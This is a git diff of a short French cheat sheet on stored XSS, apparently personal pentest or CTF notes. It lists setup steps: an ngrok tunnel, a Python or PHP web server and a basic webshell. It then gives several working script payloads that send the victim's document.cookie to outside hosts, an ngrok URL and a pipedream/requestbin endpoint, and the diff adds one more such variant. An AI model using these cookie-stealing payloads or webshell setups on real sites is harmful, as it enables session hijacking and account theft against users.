@@ -1,6 +1,6 @@
 # Stored XSS
 
-- Setup ngrok / requestbin
+- Setup ngrok
 - Setup un serveur web python / php
 - Créer un webshell basique `file.php`
 
@@ -11,9 +11,12 @@
 <script>document.location="https://3902-2a01--skipp--4aaa-d8f9-41a-64ad.eu.ngrok.io/file.php?cookie="+document.cookie;</script>
 ```
 
-## Variante
+## Variante avec requestbin
 
-`<script>document.write('<IMG SRC=\"https://eowc--skipp--pedream.net?cookie='+document.cookie+'\">Hacked</IMG>');</script>`
+```js
+<script>document.write('<IMG SRC=\"https://eowc--skipp--pedream.net?cookie='+document.cookie+'\">Hacked</IMG>');</script>`
+<script>document.location.href = 'https://eowc--skipp--pedream.net?cookies =' + document.cookie;</script>
+```
 
 ## Référence
 
